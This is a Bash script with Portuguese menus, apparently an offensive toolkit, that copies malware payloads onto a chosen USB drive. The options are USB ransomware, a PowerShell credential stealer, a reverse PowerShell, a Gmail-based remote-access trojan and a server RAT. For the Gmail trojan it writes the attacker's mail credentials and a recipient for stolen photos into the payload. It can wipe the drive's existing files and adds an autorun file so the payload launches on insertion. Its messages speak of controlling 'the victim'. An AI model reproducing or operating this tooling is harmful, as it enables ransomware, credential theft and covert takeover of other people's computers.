#!/bin/bash

readonly OFSPRING_FILE="/root/.f/offspring.txt"
readonly LICENSE_FILE="/root/.f/licenca.txt"
readonly USB_RANSOM_SRC_DIR="/source/USB-Ransom"
readonly RAT_SRC_DIR="/source/RATmail"
readonly REVERSE_DIR="/source/reverse"
readonly RATSERVER="/source/RAT"
readonly MEDIA_DIR="/media/newland"
readonly MENU_PROMPT="off> "
readonly MENU_BACK_OPTION="menu"
readonly MENU_EXIT_OPTION="sair"
readonly ONE_PROMPT="off/usb> "
readonly TXT="/root/.f/01.txt"
readonly POWERSHELL_STEALER="/source/stealer"

print_file_content() {
    clear
    cat "$OFSPRING_FILE"
}

print_welcome_message() {
    zsh /source/welcome.sh
}

print_menu() {
    cat <<EOF
    Menu:

    1) Ferramentas de Flash-USB;

    99) Sair

EOF
}

print_modules_menu() {
    cat <<EOF

    Escolha uma opção
    para automatizar:

    1) USB-RansomWare;
    2) Ladrão de Credenciais Powershell;
    3) Powershell reverso;
    4) Remote Acess Trojan via G-Mail;
    5) Remote Acess Trojan via Servidor;

    99) Voltar

EOF
    read -p "$ONE_PROMPT" option_module
}

copy_content_to_pendrive() {
    clear
    echo -e "\n$(cat "$OFSPRING_FILE")"
    cat /source/"$option_module".txt
    listar_pendrives
    echo ""
    read -p "off/usb/rat> " pendrive_number

    if (( pendrive_number >= 0 )) && (( pendrive_number < ${#pendrives[@]} )); then
        selected_pendrive="$MEDIA_DIR/$(basename "${pendrives[$pendrive_number]}")"

        if [ -d "$selected_pendrive" ]; then
            read -p "Deseja apagar os arquivos pré-existentes em $selected_pendrive? (sim/não): " delete_existing_files

            if [ "$delete_existing_files" = "sim" ]; then
                rm -r "$selected_pendrive"/*
                echo -e "[#] Arquivos pré-existentes apagados em $selected_pendrive\n"
            fi

            case $option_module in
                1) cp -r "$USB_RANSOM_SRC_DIR"/* "$selected_pendrive" ;;
		2) cp -r "$POWERSHELL_STEALER"/* "$selected_pendrive"
		   echo "[#] O Script Powershell foi ativado."
		   ;;
		3) cp -r "$REVERSE_DIR"/* "$selected_pendrive"
                    echo -n -e "[#] O Trojan ficará acessível pela internet."
                    echo -e "\n[#] Acesse o Endereço IP interno da vítima para ter controle."
                    echo -e "[#] Para a vítima, ele ficará acessível em http://127.0.0.1:80"
		    ;;
                4)
                    cp -r "$RAT_SRC_DIR"/* "$selected_pendrive"
                    echo -e "\$username=$(read -p "Insira o e-mail que será utilizado para enviar mensagens: " email; echo $email)" >> "$selected_pendrive"/Mail.ps1
                    echo -e "\$password=$(read -p "Insira a senha do e-mail: " senha; echo $senha)" >> "$selected_pendrive"/Mail.ps1
                    echo -e "\$msg.To.Add=$(read -p "Insira o e-mail que as fotos devem ser enviadas: " remetente; echo $remetente)" >> "$selected_pendrive"/Mail.ps1
                    ;;
                5)
                    cp -r "$RATSERVER"/* "$selected_pendrive"
                    echo -n -e "[#] O Trojan ficará acessível pela internet."
                    echo -e "\n[#] Acesse o Endereço IP interno da vítima para ter controle."
                    echo -e "[#] Para a vítima, ele ficará acessível em http://127.0.0.1:80"
                    ;;
                *)
                    echo "Opção inválida"
                    ;;
            esac

            echo -e "[#] Conteúdo copiado para $selected_pendrive\n"
            read -p "Deseja criar um arquivo autorun.info? (sim/não): " create_autorun

            if [ "$create_autorun" = "sim" ]; then
                echo -e ""
                read -p "Digite o nome do arquivo principal: " main_file_name
                echo -e "OPEN=$main_file_name" > "$selected_pendrive/autorun.info"
                echo -e "[#] Arquivo autorun.info criado em $selected_pendrive"
            fi

            read -p "Deseja voltar ao menu principal ou sair? ($MENU_BACK_OPTION/$MENU_EXIT_OPTION): " back_option
            case $back_option in
                "$MENU_BACK_OPTION") return ;;
                "$MENU_EXIT_OPTION")
                    echo "Saindo..."
                    exit 0
                    ;;
                *) echo "Opção inválida, retornando ao menu principal." ;;
            esac
        else
            echo "Pendrive inválido"
        fi
    else
        echo "Número de pendrive inválido"
    fi
}

listar_pendrives() {
    echo -e "\n  Selecione um pendrive:"
    echo -e "\n"
    pendrives=("$MEDIA_DIR/"*)

    if [ ${#pendrives[@]} -eq 0 ]; then
        echo "Nenhum pendrive encontrado em $MEDIA_DIR."
        exit 1
    fi

    for i in "${!pendrives[@]}"; do
        echo -e "\t$i) $(basename "${pendrives[$i]}")"
    done
}

while true; do
    print_file_content
    print_welcome_message
    print_menu

    read -p "$MENU_PROMPT" option

    case $option in
        1)
            print_modules_menu
            case $option_module in
                1 | 2 | 3 | 4 | 5) copy_content_to_pendrive ;;
                99) ;;
                *) echo "Opção inválida" ;;
            esac
            ;;
        99)
            echo "Saindo..."
            exit 0
            ;;
        *) echo "Opção inválida" ;;
    esac
done
